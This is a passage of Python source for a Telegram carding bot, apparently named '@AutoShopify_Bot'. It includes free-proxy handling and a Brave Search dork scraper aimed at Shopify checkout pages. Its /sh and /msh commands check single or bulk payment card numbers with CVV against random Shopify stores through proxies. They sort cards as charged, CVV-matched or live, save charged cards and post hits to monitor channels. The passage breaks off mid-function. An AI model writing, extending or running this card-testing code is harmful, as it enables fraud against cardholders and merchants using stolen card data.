        return

    existing   = get_user_proxies(uid)
    slots_free = MAX_PROXIES_PER_USER - len(existing)
    if slots_free <= 0:
        # List is full — remind user to Copy All instead
        await callback.answer(
            bold(f"List full ({MAX_PROXIES_PER_USER}/{MAX_PROXIES_PER_USER})! Use Copy All to save them manually."),
            show_alert=True,
        )
        return

    # Add however many fit
    to_add    = to_add[:slots_free]
    add_user_proxies(uid, to_add)
    # Cooldown already set at fetch time — don't call again
    total_now = len(get_user_proxies(uid))

    # Rebuild lines with added confirmation, no buttons
    copy_lines = []
    for p in to_add:
        ip   = p.get("ip", "?")
        port = str(p.get("port", "?"))
        user = p.get("username") or ""
        pw   = p.get("password") or ""
        copy_lines.append(f"{ip}:{port}:{user}:{pw}" if user and pw else f"{ip}:{port}")

    lines = [
        f"{pe(E['check'])} {bold(f'Added {len(to_add)} proxies to your list!')}",
        "",
        f"{pe(E['link'])} {bold('Proxies')} {bold('(ip:port:user:pass)')}",
        "",
    ]
    for i, proxy_str in enumerate(copy_lines, 1):
        lines.append(f"  {bold(str(i))}. {bold(proxy_str)}")

    all_proxies_text = "\n".join(copy_lines)
    lines += [
        "",
        f"{pe(E['sparkle'])} {bold(f'Total: {total_now}/{MAX_PROXIES_PER_USER}')}",
        f"{pe(E['hourglass'])} {bold('Next free claim in 24 hours.')}",
    ]

    # Keep Copy button, replace Add with a "Done" indicator
    kb = {
        "inline_keyboard": [[
            {
                "text": bold("Copy All"),
                "callback_data": f"freeproxy_copy:{uid}",
                "icon_custom_emoji_id": E["link2"],
                "style": "primary",
            },
            {
                "text": bold("Done"),
                "callback_data": "noop",
                "icon_custom_emoji_id": E["check2"],
                "style": "success",
            },
        ]]
    }

    await safe_edit(callback.message, "\n".join(lines), reply_markup=kb)
    await callback.answer()


# ══════════════════════════════════════════════════════════════════════════════
#  FREEPROXY COPY CALLBACK — sends all proxy strings as a plain text message
# ══════════════════════════════════════════════════════════════════════════════

@router.callback_query(F.data.startswith("freeproxy_copy:"))
async def cb_freeproxy_copy(callback: types.CallbackQuery):
    owner_id = int(callback.data.split(":", 1)[1])
    if callback.from_user.id != owner_id:
        await callback.answer(bold("These are not your proxies!"), show_alert=True)
        return

    # Try in-memory pending first, then fall back to persistent saved list
    pending = _freeproxy_pending.get(owner_id)
    if pending:
        lines = []
        for p in pending:
            ip   = p.get("ip", "?")
            port = str(p.get("port", "?"))
            user = p.get("username") or ""
            pw   = p.get("password") or ""
            lines.append(f"{ip}:{port}:{user}:{pw}" if user and pw else f"{ip}:{port}")
    else:
        lines = _load_freeproxy_last(owner_id)

    if not lines:
        await callback.answer(bold("No saved proxies. Run /freeproxy again."), show_alert=True)
        return

    await callback.message.reply(
        f"{pe(E['link'])} {bold('All proxies (ip:port:user:pass):')}\n\n"
        + "\n".join(f"<code>{l}</code>" for l in lines)
    )
    await callback.answer()


# ══════════════════════════════════════════════════════════════════════════════
#  /freeproxylist COMMAND — Show pending fetched free proxies
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("freeproxylist"))
async def cmd_freeproxylist(message: types.Message):
    uid    = message.from_user.id
    joined = await check_user_joined(uid)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    if auth.is_banned(uid):
        await message.reply(f"{pe(E['cross'])} {bold('You are banned!')}")
        return

    # Load from persistent store first (survives restarts), fall back to in-memory pending
    saved_lines = _load_freeproxy_last(uid)
    if not saved_lines:
        remaining = freeproxy_cooldown_remaining(uid)
        if remaining > 0:
            hrs  = int(remaining // 3600)
            mins = int((remaining % 3600) // 60)
            await message.reply(
                f"{pe(E['sparkle'])} {bold('No saved proxies found.')}\n\n"
                f"{pe(E['hourglass'])} {bold('Next claim in:')} {bold(f'{hrs}h {mins}m')}"
            )
        else:
            await message.reply(
                f"{pe(E['sparkle'])} {bold('No saved proxies found.')}\n\n"
                f"{pe(E['next'])} {bold('Run /freeproxy to fetch 10 free proxies.')}"
            )
        return

    copy_lines = saved_lines

    all_proxies_text = "\n".join(copy_lines)

    lines = [
        f"{pe(E['link'])} {bold(f'Your {len(copy_lines)} fetched proxies')} {bold('(ip:port:user:pass)')}",
        "",
    ]
    for i, proxy_str in enumerate(copy_lines, 1):
        lines.append(f"  {bold(str(i))}. {bold(proxy_str)}")

    lines += [
        "",
        f"{pe(E['hourglass'])} {bold('Tap Add to My List to save them.')}",
    ]

    kb = {
        "inline_keyboard": [[
            {
                "text": bold("Copy All"),
                "callback_data": f"freeproxy_copy:{uid}",
                "icon_custom_emoji_id": E["link2"],
                "style": "primary",
            },
            {
                "text": bold("Add to My List"),
                "callback_data": f"freeproxy_add:{uid}",
                "icon_custom_emoji_id": E["plus"],
                "style": "success",
            },
        ]]
    }

    tmp = await message.reply(f"{pe(E['link'])} {bold('Loading proxy list...')}")
    await safe_edit(tmp, "\n".join(lines), reply_markup=kb)


# ══════════════════════════════════════════════════════════════════════════════
#  /dork COMMAND — Brave Search URL Scraper
# ══════════════════════════════════════════════════════════════════════════════

async def _dork_bg(uid: int, query: str, proxy_str: str | None, wait_msg):
    """Background task for /dork — scrapes Brave Search and sends a .txt file."""
    total_pages = 0

    async def _progress(page: int, count: int):
        nonlocal total_pages
        total_pages = page
        try:
            await safe_edit(
                wait_msg,
                f"{pe(E['loading'])} {bold('Scraping Brave Search...')}\n\n"
                f"{pe(E['sparkle'])} {bold('Query:')} {bold(query)}\n"
                f"{pe(E['next'])} {bold(f'Page {page} done — {count} URLs found so far...')}"
            )
        except Exception:
            pass

    try:
        urls = await _dork_mod.scrape_dork(query, proxy=proxy_str, on_progress=_progress)
    except Exception as exc:
        log.exception(f"[DORK] scrape_dork error: {exc}")
        await safe_edit(
            wait_msg,
            f"{pe(E['cross'])} {bold('Scrape error:')} {bold(str(exc)[:200])}"
        )
        return

    if not urls:
        await safe_edit(
            wait_msg,
            f"{pe(E['cross'])} {bold('No URLs found for:')} {bold(query)}\n\n"
            f"{pe(E['sparkle'])} {bold('Try a different keyword or check your proxy.')}"
        )
        return

    # Build the .txt file content
    header_lines = [
        f"╔══════════════════════════════════════╗",
        f"║     @AutoShopify_Bot — Dork Results  ║",
        f"╚══════════════════════════════════════╝",
        f"",
        f"Query   : {query}",
        f"Pages   : {total_pages}",
        f"Results : {len(urls)}",
        f"",
        f"{'─' * 42}",
        f"",
    ]
    content = "\n".join(header_lines) + "\n".join(urls) + "\n"

    caption = (
        f"{pe(E['globe'])} {bold('Dork Results')}\n\n"
        f"{pe(E['sparkle'])} {bold('Query:')} {bold(query)}\n"
        f"{pe(E['check'])} {bold(f'{len(urls)} URLs')} scraped from {bold(f'{total_pages} pages')}\n\n"
        f"{pe(E['star'])} {bold('@AutoShopify_Bot')}"
    )

    try:
        await wait_msg.delete()
    except Exception:
        pass

    try:
        safe_query = re.sub(r'[^\w\s-]', '', query).strip().replace(' ', '_')[:30]
        fname = f"dork_{safe_query}.txt"
        await bot.send_document(
            uid,
            types.BufferedInputFile(content.encode("utf-8"), filename=fname),
            caption=caption,
        )
    except Exception as exc:
        log.error(f"[DORK] send_document error: {exc}")


@router.message(Command("dork"))
async def cmd_dork(message: types.Message):
    uid  = message.from_user.id
    args = message.text.split(maxsplit=1)

    joined = await check_user_joined(uid)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    if auth.is_banned(uid):
        await message.reply(f"{pe(E['cross'])} {bold('You are banned!')}")
        return

    if not _DORK_AVAILABLE:
        await message.reply(f"{pe(E['warn'])} {bold('Dork module not available on this node.')}")
        return

    if len(args) < 2 or not args[1].strip():
        await message.reply(
            f"{pe(E['globe'])} {bold('Usage:')} /dork keyword\n\n"
            f"{pe(E['sparkle'])} {bold('Examples:')}\n"
            f"  /dork shopify checkout\n"
            f"  /dork site:myshopify.com inurl:checkout\n"
            f"  /dork mobile recharge india\n\n"
            f"{pe(E['link'])} {bold('Scrapes all pages from Brave Search and sends a .txt file.')}\n"
            f"{pe(E['warn'])} {bold('Proxy required — use /proxy to add one.')}"
        )
        return

    query = args[1].strip()

    # Proxy check
    proxy_list = get_user_proxies(uid)
    if not proxy_list:
        await message.reply(
            f"{pe(E['warn'])} {bold('No proxy set!')}\n\n"
            f"{pe(E['next'])} {bold('Add one with:')} /proxy host:port:user:pass\n"
            f"{pe(E['gift'])} {bold('Or get free proxies:')} /freeproxy"
        )
        return

    # Pick a random proxy from their list
    import random as _random
    proxy_data = _random.choice(proxy_list)
    from helpers import proxy_dict_to_url
    proxy_str = proxy_dict_to_url(proxy_data)

    wait_msg = await message.reply(
        f"{pe(E['loading'])} {bold('Starting dork scrape...')}\n\n"
        f"{pe(E['sparkle'])} {bold('Query:')} {bold(query)}\n"
        f"{pe(E['next'])} {bold('Scraping up to 10 pages of Brave Search results.')}\n"
        f"{pe(E['hourglass'])} {bold('This message will update with progress.')}"
    )
    asyncio.create_task(_dork_bg(uid, query, proxy_str, wait_msg))


# ══════════════════════════════════════════════════════════════════════════════
#  /bin COMMAND — BIN Lookup
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("bin"))
async def cmd_bin(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')} /bin 438854"
        )
        return

    bin_num = re.sub(r'\D', '', args[1].strip())[:6]
    if len(bin_num) < 6:
        await message.reply(
            f"{pe(E['cross'])} {bold('BIN must be at least 6 digits!')}"
        )
        return

    loading_msg = await message.reply(
        f"{pe(E['loading'])} {bold('Looking up BIN')} {bold(bin_num)}..."
    )

    info = await bin_lookup(bin_num)

    await safe_edit(loading_msg, 
        f"{pe(E['bank'])} {bold('BIN Lookup Result')}\n\n"
        f"{pe(E['bolt'])} {bold('BIN:')} {bold(bin_num)}\n"
        f"{pe(E['star'])} {bold('Brand:')} {bold(info['brand'])}\n"
        f"{pe(E['star'])} {bold('Type:')} {bold(info['type'])}\n"
        f"{pe(E['star'])} {bold('Level:')} {bold(info['level'])}\n"
        f"{pe(E['bank'])} {bold('Bank:')} {bold(info['bank'])}\n"
        f"{pe(E['globe'])} {bold('Country:')} {info['flag']} {bold(info['country'])}"
    )


# ══════════════════════════════════════════════════════════════════════════════
#  /sh COMMAND — CC Check
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("sh"))
async def cmd_sh(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id

    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return

    # ── Antispam cooldown ─────────────────────────────────────────────────────
    remaining = check_cooldown(user_id)
    if remaining > 0:
        await message.reply(
            f"{pe(E['warn'])} {bold('Slow down!')} Please wait {bold(f'{remaining:.0f}s')} before next check."
        )
        return

    # ── Extract CC ────────────────────────────────────────────────────────────
    cc_str = None

    # 1. Check command args
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        cc_str = extract_cc(args[1])
        if not cc_str:
            # Maybe raw format without regex match, try direct
            parts = re.split(r'[|/]', args[1].strip())
            if len(parts) >= 4:
                cc_str = "|".join(p.strip() for p in parts[:4])

    # 2. Check replied message
    if not cc_str and message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        cc_str = extract_cc(reply_text)

    if not cc_str:
        await message.reply(
            f"{pe(E['warn'])} {bold('No CC found!')}\n\n"
            f"{pe(E['next'])} {bold('Usage:')} /sh 4388540109154632|03|2030|815\n"
            f"{pe(E['next'])} {bold('Or reply to a message containing a CC.')}"
        )
        return

    # ── Check proxy ───────────────────────────────────────────────────────────
    proxy_data = get_user_proxy(user_id)
    if not proxy_data:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Proxy Set!')}\n\n"
            f"{pe(E['warn'])} {bold('You must add a proxy before checking CC.')}\n"
            f"{pe(E['next'])} {bold('Use:')} /proxy host:port:user:pass"
        )
        return

    # ── Get random site ───────────────────────────────────────────────────────
    site = get_random_site()
    if not site:
        await message.reply(
            f"{pe(E['cross'])} {bold('No sites available!')}\n\n"
            f"{pe(E['warn'])} {bold('sites.json / sites.txt is empty.')}"
        )
        return

    # ── Set antispam cooldown ────────────────────────────────────────────────
    set_cooldown(user_id)

    # ── Send loading message FIRST (instant feedback) ──────────────────────────
    cc_number = cc_str.split("|")[0]
    bin_num = cc_number[:6]
    loading_msg = await message.reply(
        f"{pe(E['loading'])} {bold('Checking CC...')}\n\n"
        f"{pe(E['bolt'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(E['globe'])} {bold('Site:')} {bold(site.split('//')[1][:30] if '//' in site else site[:30])}\n"
        f"{pe(E['hourglass'])} {bold('Processing with Shopify gateway...')}"
    )

    # ── Run check + BIN lookup in parallel (saves 2-10s) ──────────────────────
    _chk = asyncio.create_task(checker_bridge.check_card_site(cc_str, site, proxy_data))
    _bin = asyncio.create_task(bin_lookup(bin_num))
    try:
        result = await _chk
    except Exception as e:
        result = {
            "Response": str(e)[:80],
            "Price": "-",
            "Gate": "-",
            "Status": "Error",
        }
    bin_info = await _bin

    # ── Format result ─────────────────────────────────────────────────────────
    response = result.get("Response", "Unknown")
    price = result.get("Price", "-")
    gate = result.get("Gate", "-")
    status = result.get("Status", response)

    # Determine status emoji and category
    rl = response.lower()
    if _is_charged_response(response, result):
        status_emoji = E["gem"]
        status_text = bold("CHARGED")
        status_line = f"{pe(E['gem'])} {bold('Order Placed!')}"
    elif any(k in rl for k in ["insufficient_funds", "insufficient funds"]):
        status_emoji = E["check2"]
        status_text = bold("CVV MATCH")
        status_line = f"{pe(E['check2'])} {bold('Insufficient Funds — CVV Matched!')}"
    elif any(k in rl for k in ["incorrect_cvc", "invalid_cvc", "incorrect_cvv", "invalid_cvv"]):
        status_emoji = E["check3"]
        status_text = bold("CCN MATCH")
        status_line = f"{pe(E['check3'])} {bold('Incorrect CVC — CCN Matched!')}"
    elif any(k in rl for k in ["incorrect_zip"]):
        status_emoji = E["check"]
        status_text = bold("LIVE")
        status_line = f"{pe(E['check'])} {bold('Incorrect ZIP — Card is Live!')}"
    elif "otp_required" in rl or "3ds" in rl:
        status_emoji = E["check"]
        status_text = bold("3DS / OTP")
        status_line = f"{pe(E['check'])} {bold('3DS / OTP Required — Card is Live!')}"
    elif any(k in rl for k in ["card_declined", "do_not_honor", "declined"]):
        status_emoji = E["cross"]
        status_text = bold("DECLINED")
        status_line = f"{pe(E['cross'])} {bold('Card Declined')}"
    elif "expired" in rl:
        status_emoji = E["cross2"]
        status_text = bold("EXPIRED")
        status_line = f"{pe(E['cross2'])} {bold('Card Expired')}"
    elif "risky" in rl:
        status_emoji = E["warn"]
        status_text = bold("RISKY")
        status_line = f"{pe(E['warn'])} {bold('Flagged as Risky')}"
    elif "incorrect_number" in rl:
        status_emoji = E["cross3"]
        status_text = bold("DEAD")
        status_line = f"{pe(E['cross3'])} {bold('Incorrect Card Number')}"
    else:
        status_emoji = E["warn2"]
        status_text = bold("UNKNOWN")
        status_line = f"{pe(E['warn2'])} {bold(response[:60])}"

    result_text = (
        f"{status_line}\n\n"
        f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(R['gate'])} {bold('Gate:')} {bold(gate)}\n"
        f"{pe(R['price'])} {bold('Price:')} {bold(str(price))}\n\n"
        f"{pe(R['bin_info'])} {bold('BIN Info:')}\n"
        f"{brand_emoji(bin_info['brand'])}{bold('Brand:')} {bold(bin_info['brand'])}\n"
        f"{pe(R['type'])} {bold('Type:')} {bold(bin_info['type'])}\n"
        f"{pe(R['level'])} {bold('Level:')} {bold(bin_info['level'])}\n"
        f"{pe(R['bank'])} {bold('Bank:')} {bold(bin_info['bank'])}\n"
        f"{pe(R['country'])} {bold('Country:')} {bin_info['flag']} {bold(bin_info['country'])}\n\n"
        f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(message.from_user.id, message.from_user.full_name, message.from_user.username)}"
    )

    await safe_edit(loading_msg, result_text)

    # ── Save charged CC ────────────────────────────────────────────────────────
    if _is_charged_response(response, result):
        auth.save_charged_cc(cc_str, user_id, (message.from_user.full_name or "Unknown"), gate, str(price))

    # Pin if order placed / charged
    if _is_charged_response(response, result):
        try:
            await bot.pin_chat_message(message.chat.id, loading_msg.message_id, disable_notification=True)
        except Exception:
            pass
        # Silent forward to monitor group
        try:
            await bot.send_message(auth.MONITOR_GROUP_ID, result_text)
        except Exception:
            pass
        # Charged notification to join channel
        await _send_charged_notification(
            user_id=user_id,
            username=message.from_user.username or "",
            full_name=message.from_user.full_name or "",
            amount=str(price),
            gate_type="shopify",
        )
    # Approved (not charged): send to approved group silently
    elif any(k in rl for k in [
        "insufficient_funds", "insufficient funds",
        "incorrect_cvc", "invalid_cvc", "incorrect_cvv", "invalid_cvv",
        "incorrect_zip",
    ]) or "otp_required" in rl or "3ds" in rl:
        await _send_approved(result_text)
        # Insufficient Funds notification to join channel
        if any(k in rl for k in ["insufficient_funds", "insufficient funds"]):
            await _send_charged_notification(
                user_id=user_id,
                username=message.from_user.username or "",
                full_name=message.from_user.full_name or "",
                amount=str(price),
                gate_type="shopify",
                status_label="Insufficient Funds",
                header_title="INSUFFICIENT FUNDS",
            )


# ══════════════════════════════════════════════════════════════════════════════
#  SHARED: format a single CC result line (compact, for /msh)
# ══════════════════════════════════════════════════════════════════════════════

def _is_charged_response(response: str, result: dict | None = None) -> bool:
    """Detect charged/ORDER_PLACED from shp.py response string or result dict."""
    rl = response.lower()
    if "order_placed" in rl or "order completed" in rl or "processedreceipt" in rl or "💎" in response:
        return True
    if result:
        if result.get("Charged") == "True" or result.get("Code") == "ORDER_PLACED":
            return True
    return False


def _to_mi(text: str) -> str:
    """Convert ASCII letters to Mathematical Italic Unicode (𝑀𝑒𝑟𝑐ℎ𝑎𝑛𝑡 style)."""
    out = []
    for ch in str(text):
        if 'A' <= ch <= 'Z':
            out.append(chr(0x1D434 + ord(ch) - ord('A')))
        elif 'a' <= ch <= 'z':
            out.append('\u210E' if ch == 'h' else chr(0x1D44E + ord(ch) - ord('a')))
        else:
            out.append(ch)
    return ''.join(out)


async def _send_charged_notification(
    user_id: int, username: str, full_name: str,
    amount: str, gate_type: str = "shopify",
    is_3d_bypassed: bool = False,
    status_label: str = "Order Placed",
    header_title: str = "ORDER PLACED",
) -> None:
    """Send a styled hit notification to the join_chat_id channel."""
    try:
        _is_order = header_title == "ORDER PLACED"

        # ── random custom emoji selection ──────────────────────────────
        _CE_HDR    = pe(random.choice(["5039670412733055750","5767209624675553166","5039816072253932764"])
                        if _is_order else
                        random.choice(["6235628846855492222","5215414165178425004","5375452661036358740"]))
        _CE_UNAME  = pe(random.choice(["5978915975808945445","5978784790327856236","5364105417569868801"]))
        _CE_NAME   = pe(random.choice(["5784914081165087232","6235252066554484059","5375295710046462188"]))
        _CE_STATUS = pe(random.choice(["5226656353744862682","5472250091332993630","5989800724312101453"])
                        if _is_order else
                        random.choice(["6235628846855492222","5215414165178425004","5375452661036358740"]))
        _CE_PRICE  = pe(random.choice(["6235459831302460476","5429651785352501917","5197369495739455200"]))
        _CE_GATE   = pe(random.choice(["5332455502917949981","5039600026809009149","5042111805288089118"]))

        uname_display = _to_mi(f"@{username}" if username else (full_name or "Unknown"))
        name_display  = _to_mi(full_name or "Unknown")
        gate_label    = _to_mi("Stripe Hitter" if gate_type == "stripe" else "Shopify")
        status_mi     = _to_mi(status_label)
        header_mi     = _to_mi(header_title)
        amount_mi     = _to_mi(str(amount))
        tds_line      = f"\n{_CE_GATE}  {_to_mi('3D Bypassed')}" if is_3d_bypassed else ""

        msg = (
            f"꒰ {_CE_HDR} ꒱  {header_mi}  ꒰ {_CE_HDR} ꒱\n"
            f"\n"
            f"{_CE_UNAME}  {uname_display}\n"
            f"{_CE_NAME}  {name_display}\n"
            f"\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"\n"
            f"{_CE_STATUS}  {status_mi}\n"
            f"{_CE_PRICE}  ${amount_mi}\n"
            f"{_CE_GATE}  {gate_label}"
            f"{tds_line}"
        )

        await bot.send_message(join_chat_id, msg, parse_mode="HTML")
    except Exception:
        pass


def _format_status_line(response: str) -> str:
    """Return the status header line for a given checker response."""
    rl = response.lower()
    if _is_charged_response(response):
        return f"{pe(E['gem'])} {bold('Order Placed!')}"
    elif any(k in rl for k in ["insufficient_funds", "insufficient funds"]):
        return f"{pe(E['check2'])} {bold('Insufficient Funds')}"
    elif any(k in rl for k in ["incorrect_cvc", "invalid_cvc", "incorrect_cvv", "invalid_cvv"]):
        return f"{pe(E['check3'])} {bold('CCN Live')}"
    elif any(k in rl for k in ["incorrect_zip"]):
        return f"{pe(E['check'])} {bold('ZIP Error — Live')}"
    elif "otp_required" in rl or "3ds" in rl:
        return f"{pe(E['check'])} {bold('3DS / OTP — Live')}"
    elif any(k in rl for k in ["card_declined", "do_not_honor", "declined"]):
        return f"{pe(E['cross'])} {bold('Declined')}"
    elif "expired" in rl:
        return f"{pe(E['cross2'])} {bold('Expired')}"
    elif "risky" in rl:
        return f"{pe(E['warn'])} {bold('Risky')}"
    elif "incorrect_number" in rl:
        return f"{pe(E['cross3'])} {bold('Dead')}"
    else:
        return f"{pe(E['warn2'])} {bold(response[:50])}"


def _format_compact_result(cc_str: str, result: dict, bin_info: dict) -> str:
    """Format a compact result block for one CC (used by /msh)."""
    response = result.get("Response", "Unknown")
    gate = result.get("Gate", "-")
    price = result.get("Price", "-")
    status_line = _format_status_line(response)

    bin_line = (
        f"{bin_info['brand']} | {bin_info['type']} | {bin_info['level']} | "
        f"{bin_info['bank']} | {bin_info['flag']} {bin_info['country']}"
    )

    return (
        f"{status_line}\n"
        f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(R['gate'])} {bold('Gate:')} {bold(gate)}\n"
        f"{pe(R['price'])} {bold('Price:')} {bold(str(price))}\n"
        f"{pe(R['bin_info'])} {bold('BIN:')} {bold(bin_line)}"
    )


# ══════════════════════════════════════════════════════════════════════════════
#  /msh COMMAND — Mass CC Check (parallel batch)
# ══════════════════════════════════════════════════════════════════════════════

_MSH_EDIT_LOCKS: dict[int, asyncio.Lock] = {}   # msg_id -> Lock


async def _msh_check_single(
    cc_str: str, proxy_data: dict, status_msg: types.Message,
    results: dict, order: list, user_name: str, user_uname: str = "", user_id: int = 0,
    sites_list: list | None = None,
):
    """Check a single CC and update the shared status message immediately."""
    site = random.choice(sites_list) if sites_list else get_random_site()
    if not site:
        results[cc_str] = {"result": {"Response": "No sites", "Gate": "-", "Price": "-"}, "bin": {"brand":"-","type":"-","level":"-","bank":"-","country":"-","flag":"🏳️"}}
    else:
        bin_num = cc_str.split("|")[0][:6]
        _bin = asyncio.create_task(bin_lookup(bin_num))
        sem = get_user_semaphore(user_id)
        async with sem:
            try:
                result = await checker_bridge.check_card_site(cc_str, site, proxy_data)
            except Exception as e:
                result = {"Response": str(e)[:80], "Price": "-", "Gate": "-", "Status": "Error"}
        bin_info = await _bin

        results[cc_str] = {"result": result, "bin": bin_info}

        # Save charged CC
        rl = (result.get("Response") or "").lower()
        if _is_charged_response(result.get("Response") or "", result):
            auth.save_charged_cc(cc_str, user_id, user_name, result.get("Gate", "-"), str(result.get("Price", "-")))

    # ── Update the shared message ─────────────────────────────────────────────
    msg_id = status_msg.message_id
    if msg_id not in _MSH_EDIT_LOCKS:
        _MSH_EDIT_LOCKS[msg_id] = asyncio.Lock()

    async with _MSH_EDIT_LOCKS[msg_id]:
        done_count = sum(1 for cc in order if cc in results)
        total = len(order)

        lines = [f"{pe(E['bolt'])} {bold('Mass Check')} [{bold(str(done_count))}/{bold(str(total))}]\n"]

        for cc in order:
            if cc in results:
                entry = results[cc]
                block = _format_compact_result(cc, entry["result"], entry["bin"])
                lines.append(block)
            else:
                lines.append(
                    f"{pe(E['loading'])} <tg-spoiler>{cc}</tg-spoiler> {bold('checking...')}"
                )

        lines.append(f"\n{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")

        new_text = "\n\n".join(lines)
        try:
            await safe_edit(status_msg, new_text)
        except Exception:
            pass

    # Clean up lock when all done
    if sum(1 for cc in order if cc in results) == len(order):
        _MSH_EDIT_LOCKS.pop(msg_id, None)


@router.message(Command("msh"))
async def cmd_msh(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    user_id = message.from_user.id

    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return

    # ── Antispam cooldown ─────────────────────────────────────────────────────
    remaining = check_cooldown(user_id)
    if remaining > 0:
        await message.reply(
            f"{pe(E['warn'])} {bold('Slow down!')} Please wait {bold(f'{remaining:.0f}s')} before next check."
        )
        return

    # ── Extract CCs ───────────────────────────────────────────────────────────
    raw_text = ""
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        raw_text = args[1]

    # Also check replied message
    if message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw_text = raw_text + "\n" + reply_text if raw_text else reply_text

    if not raw_text.strip():
        await message.reply(
            f"{pe(E['warn'])} {bold('No CCs found!')}\n\n"
            f"{pe(E['next'])} {bold('Usage:')}\n"
            f"/msh cc|mm|yy|cvv\n"
            f"cc|mm|yy|cvv\n"
            f"cc|mm|yy|cvv"
        )
        return

    # Find all CCs from the text
    from helpers import CC_PATTERN
    all_ccs = _DedupeList()
    for m in CC_PATTERN.finditer(raw_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)

    # Fallback: try line-by-line split
    if not all_ccs:
        for line in raw_text.strip().splitlines():
            line = line.strip()
            parts = re.split(r'[|/]', line)
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in all_ccs:
                    all_ccs.append(cc)

    if not all_ccs:
        await message.reply(
            f"{pe(E['cross'])} {bold('No valid CCs found in your message!')}"
        )
        return

    # ── Cap at MSH_MAX_CCS ────────────────────────────────────────────────────
    all_ccs = all_ccs[:MSH_MAX_CCS]

    # ── Gen-checker detection (ban + abort if triggered) ─────────────────────
    if not await guard_gen_cards(all_ccs, message, user_id):
        return

    # ── Check proxy ───────────────────────────────────────────────────────────
    proxy_data = get_user_proxy(user_id)
    if not proxy_data:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Proxy Set!')}\n\n"
            f"{pe(E['warn'])} {bold('You must add a proxy before checking CC.')}\n"
            f"{pe(E['next'])} {bold('Use:')} /proxy host:port:user:pass"
        )
        return

    # ── Pre-load sites ONCE (no per-CC disk I/O) ──────────────────────────────
    sites_list = _load_sites()
    if not sites_list:
        await message.reply(f"{pe(E['cross'])} {bold('No sites available!')}")
        return

    # ── Set antispam cooldown ────────────────────────────────────────────────
    set_cooldown(user_id)

    user_name = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""
    total = len(all_ccs)

    # ── Build single status message for ALL CCs ──────────────────────────────
    init_lines = [f"{pe(E['bolt'])} {bold('Mass Check')} [{bold('0')}/{bold(str(total))}]\n"]
    for cc in all_ccs:
        init_lines.append(f"{pe(E['loading'])} <tg-spoiler>{cc}</tg-spoiler> {bold('checking...')}")
    init_lines.append(f"\n{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")

    status_msg = await message.reply("\n\n".join(init_lines))

    # Shared results dict across all batches, order preserves input order
    results: dict = {}
    order = list(all_ccs)

    # ── Fire ALL checks in parallel, single message ─────────────────────────
    tasks = [
        asyncio.create_task(
            _msh_check_single(cc, proxy_data, status_msg, results, order, user_name, user_uname, user_id, sites_list)
        )
        for cc in all_ccs
    ]
    await asyncio.gather(*tasks, return_exceptions=True)

    # Pin/monitor charged; send approved to approved group
    _msh_charged_sent = False
    for cc in order:
        if cc in results:
            raw_resp = results[cc]["result"].get("Response") or ""
            r_lower = raw_resp.lower()
            is_charged = _is_charged_response(raw_resp, results[cc]["result"])
            is_approved_nc = not is_charged and (
                any(k in r_lower for k in [
                    "insufficient_funds", "insufficient funds",
                    "incorrect_cvc", "invalid_cvc", "incorrect_cvv", "invalid_cvv",
                    "incorrect_zip",
                ]) or "otp_required" in r_lower or "3ds" in r_lower
            )
            if is_charged and not _msh_charged_sent:
                _msh_charged_sent = True
                try:
                    await bot.pin_chat_message(message.chat.id, status_msg.message_id, disable_notification=True)
                except Exception:
                    pass
                try:
                    charged_text = _format_compact_result(cc, results[cc]["result"], results[cc]["bin"])
                    charged_text += f"\n\n{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
                    await bot.send_message(auth.MONITOR_GROUP_ID, charged_text)
                except Exception:
                    pass
                # Charged notification to join channel
                await _send_charged_notification(
                    user_id=user_id,
                    username=user_uname or "",
                    full_name=user_name or "",
                    amount=str(results[cc]["result"].get("Price", "-")),
                    gate_type="shopify",
                )
            elif is_approved_nc:
                try:
